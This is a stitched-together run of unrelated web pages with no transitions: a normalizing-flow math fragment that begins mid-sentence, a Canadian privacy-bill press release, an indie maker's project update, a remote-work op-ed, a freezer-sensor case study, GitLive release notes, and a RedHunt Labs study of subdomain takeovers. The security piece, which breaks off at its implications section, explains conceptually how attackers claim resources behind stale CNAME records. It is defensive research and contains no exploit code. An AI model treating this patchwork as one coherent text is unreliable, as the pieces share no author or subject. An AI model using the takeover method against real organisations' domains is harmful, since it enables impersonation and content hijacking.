\(\mathbf{J}_{f}^{-1} \approx \mathbf{J}_{g}\), and we have avoided computation of both the inverse and the Jacobian determinant.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p><p> Following this idea, we propose to define and parameterize <em>both</em> the forward and inverse functions \(f\) and \(g\) with parameters \(\theta\) and \(\gamma\) respectively. We then propose to constrain the parameterized inverse \(g\) to be approximately equal to the true inverse \(f^{-1}\) though a reconstruction loss. We can thus define our maximization objective as the mixture of the log-likelihoods induced by both models minus the reconstruction penalty constraint, i.e.:</p></div><p> $$\begin{equation} \begin{split} \mathcal{L}(\mathbf{x}) &amp; = \frac{1}{2} \log p^{f}_{\mathbf{X}}(\mathbf{x}) + \frac{1}{2} \log p^{g}_{\mathbf{X}}(\mathbf{x}) - \lambda ||g \left( f (\mathbf{x}) \right) - \mathbf{x} ||^2_2 \end{split} \end{equation}$$</p><p>We see that when \(f = g^{-1}\) exactly, this is equivalent to the traditional normalizing flow framework.</p><h2 id="examples">Examples</h2><h3 id="self-normalizing-fully-connected-layer">Self Normalizing Fully Connected Layer</h3><p>As a specific case of the above model, we consider a single fully connected layer, as exemplified in the figure at the top of this post. Let \(f(\mathbf{x}) = \mathbf{W} \mathbf{x} = \mathbf{z}\), and \(g(\mathbf{z}) = \mathbf{R} \mathbf{z}\), such that \(\mathbf{W}^{-1} \approx \mathbf{R}\). Taking the gradient of objective for this model, and approximating inverse matricies with their learned inverses, we get:</p><p> $$\begin{equation} \begin{split} \frac{\partial}{\partial \mathbf{W}} \mathcal{L}(\mathbf{x}) &amp; = \frac{1}{2} \underbrace{\left(\frac{\partial}{\partial \mathbf{W}} \log p_{\mathbf{Z}}(\mathbf{W} \mathbf{x}) + \mathbf{W}^{-T}\right)}_{\textstyle \approx \delta_{\mathbf{z}} \mathbf{x}^T + \mathbf{R}^T} \ - \frac{\partial}{\partial \mathbf{W}} \lambda \mathcal{E} \end{split} \end{equation}$$ $$\begin{equation} \begin{split} \frac{\partial}{\partial \mathbf{R}} \mathcal{L}(\mathbf{x}) &amp; = \frac{1}{2} \underbrace{\left(\frac{\partial}{\partial \mathbf{R}} \log p_{\mathbf{Z}}(\mathbf{R}^{-1} \mathbf{x}) - \mathbf{R}^{-T} \right)}_{\textstyle \approx - \delta_{\mathbf{x}} \mathbf{z}^T - \mathbf{W}^T}\ - \frac{\partial}{\partial \mathbf{R}} \lambda \mathcal{E} \\ \end{split} \end{equation}$$</p><p>where \(\mathcal{E}\) denotes the reconstruction error, \(\frac{\partial}{\partial \mathbf{W}} \lambda \mathcal{E} = 2\lambda \mathbf{R}^T(\hat{\mathbf{x}} - \mathbf{x}) \mathbf{x}^T\), \(\frac{\partial}{\partial \mathbf{R}} \lambda \mathcal{E} = 2\lambda (\hat{\mathbf{x}} - \mathbf{x})\mathbf{z}^T\), …</p></article></div>

    <p>Law to include the strongest fines among G7 for privacy laws</p> 
<p><strong>November 17, 2020</strong> – Ottawa, Ontario</p> 
<p>The COVID-19 pandemic has transformed how Canadians live, work, access information and connect with each other, making digital technology more important than ever. The Government of Canada is committed to ensuring that Canadians can interact in this digital space trusting that their personal information is safe and secure and that their privacy is respected.</p> 
<p>Today, the Honourable Navdeep Bains, Minister of Innovation, Science and Industry, introduced the proposed Digital Charter Implementation Act, 2020, which modernizes the framework for the protection of personal information in the private sector.&nbsp;</p> 
<p>This legislation takes a number of important steps to ensure that Canadians will be protected by a modern and responsive law and that innovative businesses will benefit from clear rules, even as technology continues to evolve, including:</p> 
<ul> 
 <li>increasing control and transparency when Canadians’ personal information is handled by companies;</li> 
 <li>giving Canadians the freedom to move their information from one organization to another in a secure manner;</li> 
 <li>ensuring that Canadians have the ability to demand that their information be destroyed;</li> 
 <li>providing the Privacy Commissioner with broad order-making powers, including the ability to force an organization to comply and the ability to order a company to stop collecting data or using personal information; and</li> 
 <li>ensuring the strongest fines among G7 privacy laws—with fines of up to 5% of revenue or $25 million, whichever is greater, for the most serious offences.</li> 
</ul> 
<p>The proposed Digital Charter Implementation Act, 2020 builds a foundation of trust and transparency between citizens, companies and government, while ensuring that innovators and businesses benefit from a modernized framework with clear rules.</p> 
<p>The proposed act is an initial step toward a comprehensive reform of Canada’s privacy framework. The Government of Canada is also proposing to modernize the <em>Privacy Act</em>, which applies to the federal public sector and which the Privacy Commissioner of Canada also oversees.&nbsp;<strong></strong></p>

	<p><i>November 18th 2020</i></p>

	<p>Six months ago, I set myself the goal of creating one tiny project each week.</p> 

	<p>My main aim was to get better at testing out all the ideas I had written down in my phone, but not actually done anything with.</p>

	<p>26 weeks later, and a quick glance of this website, you'll notice I've launched 6 things.</p>

	<p>Although I'm 20 projects short, it's not all bad. My projects are generating some passive income, I've gone from no online following, to a few hundred twitter followers, and I've had a great time building weird and wonderful internet things.</p>

	<p>In this post I'll give an update on how these projects are performing, and the pros and cons of launching micro-businesses.</p>

	<p>Let's rewind.</p>

	<h3>💡 <a href="https://tinyprojects.dev/projects/tiny_website" target="_blank">Tiny Website</a></h3>
	<ul>
		<li><i>Page views: <b>129,000</b></i></li>
		<li><i>Unique users: <b>58,000</b></i></li>
		<li><i>HN Upvotes: <b>348</b></i></li>
		<li><i>Cost: <b>£10.00</b></i></li>
	</ul>

	<p>Tiny Projects was born the day after my 25th birthday. Project #1 is this bare-bones tiny website that you're reading right now.</p>

	<p>When it launched, the only content on this website was a blog post, a guide on making tiny websites, and an update about my goals.</p>

	<p>Randomly, I decided to submit my blog post "Tiny websites are great" onto Hacker News. Over the next 24 hours it hit the top of the front page, bringing 25k users to this site in its first day. It was absolutely thrilling.</p>

	<p>As a double whammy, the guide I'd produced also hit the top of the learn programming sub-reddit with 1.3k upvotes.</p>

	<p>Somehow, I'd managed to hit a homerun with no idea what I was doing. Pageviews, followers and emails were flying in fast. Anyone who has produced a bit of viral content on the internet will know, the dopamine rush is insane.</p> 

	<h3>🌐 <a href="https://tinyprojects.dev/projects/silicon_valley_domain_names" target="_blank">Silicon Valley Domain names</a></h3>
	<ul>
		<li><i>Page views: <b>28,500</b></i></li>
		<li><i>Unique users: <b>25,500</b></i></li>
		<li><i>HN Upvotes: <b>410</b></i></li>
		<li><i>Cost: <b>£76.25</b></i></li>
	</ul>

	<p>Funnily enough, my second Tiny Project was the only one I actually completed in a week. Spurred on by the previous project, I was keen to replicate my success.</p>

	<p>I wanted to investigate domain names. Specifically, was it possible to buy a google.x domain name? It was an investigative piece with a bit of coding sprinkled in.</p>

	<p>Completing this project in a week was gruelling. My day-job was neglected, and I pulled some very long hours. However, 7 days later, I hit publish on my second blog post: "I bought netflix.soy".</p>

	<p>Again, I posted it on Hacker News. It became the most viral thing I've written.</p>

	<p>The Tiny Projects website received 28k page views, and the post got 410 upvotes. Hundreds of followers and emails again poured in.</p>

	<p>Writing two viral pieces back-to-back made me question what I was really doing. Somehow I'd  stumbled into writing click-baity blog posts for Hacker News instead of building tiny projects.</p>

	<p>6 months on, I still own all the domains I purchased for this project except the Facebook one. Damn you Zuck.</p>

	<h3>⚔️ <a href="https://tinyprojects.dev/projects/battle_royale" target="_blank">8-bit Battle Royale</a></h3>
	<ul>
		<li><i>Downloads: <b>25</b></i></li>
		<li><i>HN Upvotes: <b>3</b></i></li>
		<li><i>Revenue: <b>£0.00</b></i></li>
		<li><i>Cost: <b>£36.71</b></i></li>
	</ul>

	<p>For my third tiny project, I decided I wanted to make an online game.</p>

	<p>With minimal knowledge of Unity, I cobbled together a tiny battle royale game called "Wee Royale" in 2 weeks and launched it on Android.</p>

	<p>Posting this project write up on Hacker News got zero attention. I expected this, as it didn't really fit the usual HN content, but I was still disappointed. My brain had been jaded by the massive numbers of the first two posts.</p>

	<p>Wee Royale currently has 25 downloads on the Google Play Store. I'm actually not sure if the game still works though.</p>

	<p>Overall, Wee Royale was a flop, but it was hilarious to play it with my friends.</p>

	<h3>🛍️ <a href="https://tinyprojects.dev/projects/one_item_store" target="_blank">One Item Store</a></h3>
	<ul>
		<li><i>Page views: <b>1,500</b></i></li>
		<li><i>Stores: <b>1,400</b></i></li>
		<li><i>PH Upvotes: <b>83</b></i></li>
		<li><i>Revenue: <b>£1.63</b></i></li>
		<li><i>Cost: <b>£41.00</b></i></li>
	</ul>

	<p>With a minimalist design, and the tag line "just sell your stuff", One Item Store lets anyone create an online shop in minutes to sell their goods.</p>

	<p>After two weeks of building my micro e-commerce platform, I launched it on Product Hunt. At the end of the day I finished on the homepage with 83 upvotes.</p>

	<p>Today, people have created over 1400 stores, selling everything from t-shirts, to human beings. I've seen some very strange things.</p>

	<p>In total, £163.09 has flowed through One Item Store checkouts, mainly from a car dealership in Australia offering deals throughout the pandemic. I take a small 1% fee on every transaction, netting me a small fortune of £1.63.</p>

	<p>Although its not a significant amount, this was my first Tiny Projects internet money! The best thing is, One Item Store makes money without me having to do anything.</p>

	<p>One Item Store is a Tiny Project I'd like to continue building. My next step would be to add some better checkout designs, and make the website look a bit more legit.</p>

	<h3>📗 <a href="https://tinyprojects.dev/projects/snormal" target="_blank">Snormal</a></h3>
	<ul>
		<li><i>Page views: <b>2,000</b></i></li>
		<li><i>Users: <b>200</b></i></li>
		<li><i>PH Upvotes: <b>59</b></i></li>
		<li><i>Revenue: <b>£0.00</b></i></li>
		<li><i>Cost: <b>£10.00</b></i></li>
	</ul>

	<p>Snormal is a social network for everything that doesn't make it onto your Instagram highlight reel. A typical post on Snormal is something like: "Dude, I just ate a whole baguette in bed".</p>

	<p>I launched Snormal with zero intentions of making any money. It was a bit of a social experiment to see if people were becoming as jaded with social media as me.</p>

	<p>After 1 month of building, and an accidental Product Hunt launch, Snormal has gone on to gain 200 registered users, who have scrolled 4432 times on the discover feed.</p>

	<p>Its incredibly fun running a micro-social network.</p>

	<p>Two weeks after Snormal launched, I hadn't implemented comments on posts. When I finally added them, it felt godlike letting people finally talk to each other.</p>

	<p>Growth on Snormal slowly increasing. For some strange reason it has become popular in Portugal. Have a scroll now, and you'll see loads of statuses in Portugese.</p>

	<h3>💸 <a href="https://tinyprojects.dev/projects/earlyname" target="_blank">Earlyname</a></h3>
	<ul>
		<li><i>Page views: <b>10,000</b></i></li>
		<li><i>Subscribers: <b>1,500</b></i></li>
		<li><i>PH Upvotes: <b>274</b></i></li>
		<li><i>MRR: <b>$200.00</b></i></li>
		<li><i>Cost: <b>$108.20</b></i></li>
	</ul>

	<p>Earlyname helps you claim rare usernames (like @ben or @alice) on new, emerging social platforms. Currently it is generating $200/month.</p>

	<p>Running Earlyname is so much fun. I get to talk with founders, try out new products, do a bit of web scraping/automation, and find rare usernames for people.</p>

	<p>The only downside is that it requires my input every month to produce a new email. I'm anxious for the month I can't find any new social platforms.</p>

	<p>At present, Earlyname has 1500 subscribers on its email list, a number which thankfully seems to be growing naturally.</p>

	<p>Although its currently only at $200/mo, its cool to think Earlyname is generating $2k/year. My plan is to keep plugging away launching monthly newsletters and see how high that monthly revenue number can get.</p>

	<h3>👍 Positives of Tiny Projects</h3>

	<p>I believe there's a big advantage to this "micro-bet" approach of launching many tiny businesses, and then sticking with the ones that become successful.</p>

	<p>Firstly, it drastically reduces the risk of putting too much time into an idea that doesn't quite work. Even if you stumbled across a decent idea that did work, what if there's an amazing one just around the corner? It keeps you on your toes.</p>

	<p>Creating lots of tiny businesses also keeps things fun and interesting. This is probably the most important factor for me.</p>

	<p>Feeling obligued to keep building something that you've sunk hundreds of hours into but no longer enjoy sounds like my personal hell.</p>

	<p>With tiny projects, the stakes are so low, I can kill a project with no guilt and build something else, or just bounce between the projects I want to work on.</p>

	<h3>👎 Negatives of Tiny Projects</h3>

	<p>My original plan was to launch one tiny project each week, however I've realised this is an insane schedule. You can't build or document anything meaningful in this time.</p>

	<p>This schedule might be possible if I treated Tiny Projects full-time like a YouTuber. But, I don't think going all in on Micro-SaaS businesses would be very fun with the revenue they're currently generating.</p>

	<p>1-2 months is a more reasonable tiny project timeframe. It gives you enough time to build something with substance, and test the idea thoroughly.</p>

	<p>One major downside of launching lots of things is that you become way too happy to give up on a project when it doesn't show instant success.</p>

	<p>Perhaps if I spent more time on marketing, or slightly pivoted a project, I could see more success. Currently, I'm more inclined to just start something new.</p>

	<p>Maintaining lots of software can also become a bit of a burden. Once the domain name renewal date comes around, I'll have to make some decisions as to whether a project lives on for another year or not.</p>

	<h3>🔮 Conclusions &amp; The Future</h3>

	<p>I feel like I'm trying to learn the skill of generating better ideas, and rapidly building and launching them into a business.</p>

	<p>I try to think about this process like going for a run. The more runs I do, the faster and fitter I'll be. The more projects I launch, the better and more profitable they'll be.</p>

	<p>How often does someone build &amp; launch a business in their lifetime? I'm hoping that by doing this process over and over again, I'll discover some really interesting things.</p>
	
	<p>My main goal for the next six months of Tiny Projects is to learn how to get better at making money on the internet from my projects.</p>

	<p>A Product Hunt launch can easily get you a spike in traffic, but afterwards I really don't know what I'm doing. There's this whole other level afterwards called "sales &amp; marketing" that I want to master.</p>

	<p>Another goal is to also be more consistent with my writing. Hopefully, this ultimately means you'll be hearing a lot more things from me!</p>

	<p>It was nice to catch up.</p>

  <h2>Remote work is a once-in-a-generation chance for rebalancing the economy. Here is the problem, solution, and next steps for governments &amp; local bodies</h2>
  
  <p><img src="https://remote-tools-images.s3.amazonaws.com/Art_Of_Managing_Male_Final.png" width="100%" max-width="700px" alt="Remote work is our once-in-a-generation chance to rebalance the economy"></p><p>Last week, Deutsche bank came up with an absurd suggestion of having a <a target="_blank" href="https://remoteclan.com/s/klhjgx/deustche_bank_study_poses_question">5% privilege tax for those who work remotely</a>. Their argument: when people work from home, they use less of public infrastructure &amp; the entire ecosystem surrounding the office suffers. So the tax helps give a push to the economy. Not only is this a very narrow view of the impact of remote work at scale but it also completely ignores a large-scale economy problem that can be fixed with remote working. This is a once-in-a-generation chance of rebalancing the economy, so we have to act now else it's no use.</p><br>
<h2>Problem: Regional inequality = Overcrowded &amp; expensive metropolitan cities</h2>
<p>Post the industrial era, many technological &amp; economical forces have fuelled the rise of cities. Over the years, this has caused overcrowding of metropolitan cities. <a target="_blank" href="https://voxeu.org/article/return-regional-inequality-europe-1900-today">This study</a> of Europe from 1900 to today shows that 1980 was a point of inflection after which the migration to big cities &amp; the gap of regional inequality has only increased.</p>
<p>Governments have been trying hard to reduce this regional inequality e.g. financial incentives or lower taxes to attract big employers. But nothing has worked at scale to lure people away from a handful of cities.</p><br>
<h2>Solution: Large-scale migration from big cities to tier-2 cities &amp; towns, thanks to remote work</h2>
<p>The sudden remoteness situation due to Covid19 and its permanent impact on our way of working has opened up a new, rare possibility - people dispersing from a few overcrowded, expensive cities to tier-2 cities &amp; towns while retaining their good jobs.</p>
<p>The shift, when it happens, would also be a more organic one compared to governments persuading employers &amp; individuals to move away from cities. The great thing is that governments just need to act as catalysts in facilitating this transition which is already happening.</p><br>
<h2>This chance of rebalancing the economy is not to be wasted. Next steps for governments &amp; local bodies:</h2>
<p>As I said, the lure to move away from cities is already taken care of by the pandemic. Governments just need to make more the transition more easier &amp; lucrative.</p>
<p>Here's a few recommendations for local &amp; national policymakers of things that can be done in tier-2 cities &amp; towns:</p>
<p>1. Ensuring availability of fast broadband internet (we have written more about the necessity of this <a href="https://www.remote.tools/remote-work/remote-work-bill-of-rights" target="_blank">here</a>).<br>2. Setting up &amp; repairing basic public services (e.g. schools, transport, hospitals) which are preconditions for a good place to live &amp; raise a family.<br>3. Setting up co-working spaces &amp; mobile offices.<br>4. One-time incentive or bonus if people make the move from cities to towns.<br>5. Rubbishing claims of any kind of tax or pay cuts for working remotely (no-brainer, but just calling it out).</p>
<p>Local governments have instituted such programs in the past &amp; they can serve as great inspirations, e.g. <a target="_blank" href="https://tulsaremote.com/">Tulsa Remote</a>.</p>
<p>Regional inequality poses huge problems and we have got this one chance in many decades to actually fix it. Let's make sure we don't lose out on this one :)</p>

        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2>Food stays fresh during the lockdown with remote cold storage monitoring.</h2>
<p>Due to the <a href="https://www.disruptive-technologies.com/blog/post-covid-confidence" target="_self">COVID-19 lock-down</a>, a global restaurant chain in the UK (ca. 100 locations) was facing a cold monitoring problem: How to monitor daily freezers as per <a href="https://www.food.gov.uk/topic/storage-refrigeration" target="_self">UK regulations</a> when employees are not on location?</p>
<p>The risk was to compromise more than <strong>£1.25 million </strong>in food stock, generating a financial and environmental disaster. Without a possibility to remotely monitor the temperature in each freezer and to act accordingly if necessary, the global chain would not have been able to ensure that the food stayed at a correct and safe temperature after reopening, leaving them no choice but to throw away their entire inventory.</p>
<!--more-->
<h2>A Sensor-Based Remote Monitoring Solution = A Quick Response to Extraordinary Circumstances</h2>
<p>In a few days, our customer needed a solution that:</p>
<ul>
<li>Allowed them to remotely monitor the temperature in each of their 100 freezers all across the UK, in real-time, 24/7.</li>
<li>Offered the possibility to send alerts directly to the regional manager if any malfunctions were detected</li>
<li>They can install very easily and quickly, with no technical skills required</li>
</ul>
<p>Within three days, the Infogrid <a href="https://www.disruptive-technologies.com/smart-cold-storage" target="_self">cold storage solution powered by Disruptive Technologies</a> was implemented in all locations. Then, when needed, alerts allowed their staff to move food to a functioning freezer or to fix malfunctioning ones. As a result, ensuring the correct storage, more than <strong>£1.25 million in food inventory was saved</strong>. That amounts to <strong>cost savings of 4,462.04%.</strong></p>
<p>In addition, thanks to the 24/7 monitoring system (compared to the daily physical monitoring), eight freezers have been identified as not operating within the expected parameters and temperature incidents have been detected on five others.</p>

<blockquote><span><em>Crisis averted thanks to Infogrid. I was so impressed at the speed and ease at which we were able to install sensors across every site and start collecting data. Not only did it save £1.25m of food stock, but it also helped us to manage our sites remotely during lockdown, and automatically alerted us about multiple faults with our freezers." </em></span></blockquote>

<h2>Remote Cold Storage Monitoring Examples</h2>
<h3>#1 - Optimal Freezer Operation Example</h3>

<p><img src="https://www.disruptive-technologies.com/hubfs/Google%20Drive%20Integration/20200930%20-%20DT%20-%20TGI%20Fridays%20Case%20study-2.png" alt="good freezer operation example"></p>

<ol type="1">
<li><strong>Regular moves within the defrost cycle. </strong>The freezer moves consistently from 0.5-1.0°C, then has a regular (typically every 3 hours) defrost cycle where it warms and cools more than 5°C in more than 1 hour.</li>
<li><strong>The temperature stays within the threshold. </strong>The freezer stays within the alert parameters. During the defrosting cycle, temperatures may pop above the threshold for less than 1.5hrs, presenting no risk to food safety.</li>
</ol>
<h3>#2 - Outside Temperature Range Alert Example</h3>

<p><img src="https://www.disruptive-technologies.com/hubfs/Google%20Drive%20Integration/20200930%20-%20DT%20-%20TGI%20Fridays%20Case%20study-3.png" alt="outside temperature range alert example"></p>

<ol type="1">
<li><strong>Freezer breaches alert parameters. </strong>The freezer goes above -14°C for more than 1.5 hrs. An alert triggers, informing the company’s Regional Director that food may be at risk and to follow predetermined emergency freezer monitoring procedures. The freezer spends less than 4 hours outside the recommended parameters and then returns to its normal operation following the incident.</li>
</ol>
<h3>#3 - Poor Defrosting Cycle Example</h3>

<p><img src="https://www.disruptive-technologies.com/hubfs/Google%20Drive%20Integration/20200930%20-%20DT%20-%20TGI%20Fridays%20Case%20study.png" alt="freezer defrosting cycle example"></p>

<ol type="1">
<li><strong>Poor defrost cycle identified. </strong>The freezer’s normal running temperature was identified as acceptable at -18°C, but it’s defrosting cycle moved almost 45°C to +25°C in less than an hour, posing a significant risk to food safety. The food stock was moved from the freezer.</li>
<li><strong>Engineer called. </strong>An engineer visited the premises and repaired the freezer, which is now operating within normal limits.</li>
</ol>
<h3>#4 - Freezer Malfunction Example</h3>

<p><img src="https://www.disruptive-technologies.com/hubfs/Google%20Drive%20Integration/20200930%20-%20DT%20-%20TGI%20Fridays%20Case%20study-1.png" alt="freezer malfunction example"></p>

<ol type="1">
<li><strong>Broken freezer. </strong>On installation, the freezer’s temperature ranged from 0°C to +14°C, confirming that it was likely broken. The food stock was removed from the freezer and disposed of.</li>
<li><strong>Engineer called. </strong>An engineer visited the premises and repaired the freezer, which is now operating within normal limits.</li>

            <div>
                <p>GitLive 8.0 includes a new  <a href="#cherry-picking">cherry picking</a> feature, which allows you to seamlessly share code with your teammates. There are also a number of additional updates to this version that we hope you will find useful:</p>
<ul>
  <li><a href="#cursor-position-indicators-while-collaborating">Cursor position indicators while collaborating</a> - Keep track of your teammate’s caret when editing together with cursor position indicators in the gutter.</li>
  <li><a href="#support-for-the-debugger-while-editing-together">Support for following when using the debugger</a> - The real time editing feature, cursor following, now works when using your IDEs debugging functionality.</li>
  <li><a href="#support-for-installation-free-github-integration-on-jetbrains-ides">Support for installation-free Github integration on JetBrains IDEs</a> - With any JetBrains IDE, you can now use GitLive without having to install the app on your GitHub organisation.</li>
</ul>

<h4 id="cherry-picking">Cherry Picking</h4>
<p>Live diffs allow easy access to your teammates local changes relative to the remote state and were included as part of the <a href="https://blog.git.live/teamhub-1-5-now-available-with-live-diffs">1.5 release of GitLive</a>. To seamlessly apply your teammate changes to your own file, GitLive introduces Cherry Picking.</p>

<p>Click on your teammate’s working copy and select the Cherry Pick option. Once you accept the changes, you will have your teammate’s changes in your local copy.</p>

<h4 id="cursor-position-indicators-while-collaborating">Cursor position indicators while collaborating</h4>
<p>Since launching real-time editing in the <a href="https://blog.git.live/gitlive-6.0-Code-together-in-real-time">6.0 release of GitLive</a>, we’ve received valuable feedback on how to improve the experience of real-time collaboration further.
This is why we have introduced cursor position indicators in the gutter allowing you to conveniently track your teammates position in the file relative to yours. This comes in handy when working together in large files.</p>

<h4 id="support-for-the-debugger-while-editing-together">Support for the debugger while editing together</h4>
<p>GitLive’s real time editing feature, which allows you to follow a teammate’s cursor as they make changes, is now available while using the debugger. Hitting a breakpoint or selecting a different frame in the call stack will now cause followers to jump to the same line. Breakpoints in your code don’t have to lead to breakdowns in communication!</p>

<h4 id="support-for-installation-free-github-integration-on-jetbrains-ides">Support for installation-free GitHub integration on JetBrains IDEs</h4>
<p>Good news for Github users: You can now use GitLive in any Jetbrains IDE without having to install the GitLive App on your GitHub organisation. To do this, make sure your GitHub account is set up correctly in your IDE under <span><em>Settings -&gt; Version Control -&gt; GitHub</em></span>. After that, all you have to do is open a new or existing repository, sign in to GitLive and you should see the window below appear. Since installing an app on an organisation often requires checks and approvals, this gives you a way to skip these steps and get started with GitLive straight away!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><br>At RedHunt Labs, we regularly perform various internet-wide studies under <strong><a rel="noreferrer noopener" href="https://redhuntlabs.com/blog/project-resonance-wave-0.html" data-type="URL" data-id="https://redhuntlabs.com/blog/project-resonance-wave-0.html" target="_blank">Project Resonance</a></strong>, to keep up with ever-changing cyberspace as well as to enrich our product <a rel="noreferrer noopener" href="https://redhuntlabs.com/nvadr" data-type="URL" data-id="https://redhuntlabs.com/nvadr" target="_blank"><strong>NVADR</strong></a>. This blog post is about one of our recent studies related to misconfigured CNAME records that can cause subdomain takeovers on a massive scale.</p>



<h3>Introduction to Subdomain Takeover</h3>



<p>DNS is the backbone of the internet. It is often called the internet’s phone book as it maps human-perceivable domain names to IP addresses that computers understand. Without DNS, there wouldn’t be online websites that can be remembered. There’s no google.com, twitter.com, or redhuntlabs.com, just a weird sequence of numbers.</p>



<p>A domain can be pointed to an IP address or another domain/host using DNS records such as A, CNAME, DNAME, etc. A domain/subdomain cannot be taken over, when both the DNS record and the resource it points to (IP or another domain), is under control. If the owner of the domain loses ownership of the resource the DNS record points to, the resource itself might become claimable.</p>



<p>Here are a few <strong><a rel="noreferrer noopener" href="https://www.hackerone.com/hacktivity" data-type="URL" data-id="https://www.hackerone.com/hacktivity" target="_blank">HackerOne</a></strong> reports showing how attackers claimed the resources pointed by stale DNS records of famous companies. <strong><a rel="noreferrer noopener" href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover" target="_blank">Searching</a><a href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover"> for it on HackerOne</a> </strong>gives 100+ such reports. Few reports show how attackers were able to exploit / bypass other web app functionalities with the help of this vulnerability.</p>







<h3>How does it work?</h3>



<p>Let’s say a developer wants to create a web app for his newly created organization. A decade ago, this process would be something similar to this: buy/lease an IP address, host your website on the server and point the DNS record to this IP. This process remained the same even if you wanted to host a static website or a landing page.</p>



<p>With the increase of Cloud and other SaaS services, now all the developer needs to do is use a service to host the website and point the DNS record to the resource. For example, at Heroku, such a domain/subdomain would take the form “<em>newproject.herokuapp.com”</em>. The developer will ultimately want the web app to appear to be hosted on a domain/subdomain (say, <em>app.neworg.com</em>) of his own organization’s domain. Therefore, he makes use of a CNAME record which is configured to forward all queries to his organization’s subdomain, i.e. <em>app.neworg.com</em>, to the cloud provider’s subdomain, <em>newproject.herokuapp.com</em>, where the web app is hosted.</p>

<p>Now the potential for a subdomain takeover occurs when the webpage hosted at the cloud provider is deleted but the DNS entry is retained. The attacker simply now re-registers the host at the cloud provider, adds the organization’s subdomain as an alias, and thus controls what content is hosted. Since the stale CNAME records originally have not been removed, <em>app.neworg.com </em>starts serving the attacker-controlled content.</p>



<p>In a similar way, another variant is known as “second-order subdomain takeovers” or more popularly, “<a rel="noreferrer noopener" href="https://edoverflow.com/2017/broken-link-hijacking/" target="_blank"><strong>broken-link hijacking</strong></a>” occurs when the potentially vulnerable subdomains are used to serve content on the target’s website but they do not necessarily belong to the target. This means that the resource is being served on the webpage, for example, via a blob of JavaScript, and the attacker can claim the subdomain from which the resource is being imported. Second-order takeovers usually have a lesser impact than the earlier, but still pose a significant threat from an organization’s perspective.</p>



<h3>What we did.</h3>



<p>Our motivation was to perform a survey and analyze the status quo of vulnerable domains/subdomains in the present cyberspace. We conducted an internet-wide survey consisting of approximately 220 million hosts collected by our thousands of bots collecting various kinds of asset information from all over the internet. A database was created which contained CNAME records and related fingerprints of several vulnerable platforms, many of which we ingeniously studied to see if they can be taken over (if added as a service) as well as picked some of them that are already known to be vulnerable.</p>



<p>An automation setup was designed to effectively perform the task of checking whether the domains/subdomains were vulnerable to takeover. </p>

<p>The entire setup consisted of mainly 3 components:</p>



<ul><li><strong>DNS Resolving</strong>: This component was mainly entitled to the task of mass resolving domains to their CNAME records by making DNS queries. It took input from the input-queue consisting of domains/subdomains and generated an output compatible with the HTTP component.</li><li><strong>HTTP Response Grabbing</strong>: The output from the DNS resolving entity was fed into this element, which did with the task of making mass HTTP queries to the domains and look for potential takeovers.</li><li><strong>Filtering &amp; Analysis</strong>: This component took the load of filtering out false positives from the results obtained through several layers before flagging a domain as vulnerable. This constituent also performed an analysis of the data obtained.</li></ul>



<p>The system was designed to intelligently detect possible takeovers while handling all kinds of exceptions and keeping in mind other complications of the HTTP protocol. The tool was also suited to follow the pattern of the database which was created. The flowchart below defines the overall logic around which the tool functioned:</p>

<p>Taking a deep dive at the statistics generated by our research, surprised us by the massive numbers. The first thing that came to our notice was the fact a total of 33 services that (unintentionally) allowed for potential subdomain takeovers, were identified. Interestingly, a large percent (62%) of vulnerable DNS records pointed to Shopify. This also indicates that most of the vulnerable domains belonged to the E-commerce industry, signifying that e-commerce still remains largely affected by security issues.&nbsp;</p>

<p>In the other half of results, Unbounce (landing pages creator) ranked second highest in the vulnerable share consuming about 14% of vulnerable domains, followed by Heroku (9%), GitHub Pages (4%), Bigcartel (2%), Tumblr (1%), Webflow (1%) and Pantheon (1%). The remainder 20% of the shares consisted mostly of WordPress, Surge.sh, AWS, etc, with HelpJuice comprising the least of the shares (just 15 takeovers).</p>



<p>Diving deeper into the results obtained, our first and foremost observation was that amongst Alexa Top 1000 domains, we identified 139 possible takeovers. </p>



<figure><blockquote><p>Overall, we identified a total of 424,120 subdomains had misconfigured CNAME records, and were prone to take over across the internet. It simply means that organizations still have a huge number of assets (subdomains, in this case) which are untracked and hence potentially vulnerable to subdomain takeover. </p></blockquote></figure>

<p>A very significant pattern which we observed was that interestingly the most common vulnerable subdomain was&nbsp; <em>”www”</em>, which means most of the stale records pointed to the “home subdomain” of the sites. The next popular subdomain name was <em>“shop”</em>, followed by <em>“store”</em> and <em>“blog”</em>.</p>



<figure><blockquote><p>Since Chrome 69, Google has decided to strip the “www” and “m” subdomains from the URL displayed in the browser’s address bar. So if such a subdomain get compromised, for a normal user, it becomes quite difficult to figure out that it might be browsing attacker-controlled content.</p></blockquote></figure>







<p>Analyzing all the domains within our database, we also found ~200 non-functional <em>.gov</em> site subdomains prone to takeover. An extremely mind-boggling observation here was that one of the domains had implemented a wildcard CNAME record, and the service to which it was pointing was non-existent (i.e. claimable). <em>The security impact of such a case is beyond comprehension because a wildcard CNAME entry implies that *.site.tld will resolve, signifying that once the service has been taken over, not only the existing ones but non-existent subdomains of the site will also resolve to the attacker-controlled service.</em></p>



<p>We also observed that several (around ~1K) subdomains were <em>.edu</em> sites that were vulnerable to takeover. Unbounce and Pantheon were among the top popular vulnerable services within the <em>.edu</em> domains. The results included subdomains from a lot of prestigious universities. This also sheds some light on the kind of infrastructure that some of the top educational sites use.&nbsp;</p>

<p>On the other hand, healthcare, wellness, and fitness sites too consumed a significant share of the vulnerable subdomains (around ~5K). In this case, Unbounce and Strikingly took the top places in vulnerable services. A worth noting point in this section is the diverse set of results that had been harvested, which ranged from sellers of pharmaceutical items to online consultancy services, from fitness centers to healthcare gear distributors, denoting that all of them were significantly affected by security issues.&nbsp;</p>



<p>The sports and gaming section too had around ~4K takeovers while the entertainment sector consumed a minor share (around 500). Similar to the health sector, this too affected a wide range of offerings, from several video game retailers to sport-specific training providers. The list is long and we can continue reading from our insights but we just decided to focus on the major ones for now.</p>



<h3>Implications of a takeover.</h3>



<p>Following an attacker’s perspective, such takeovers can be abused in several ways:</p>



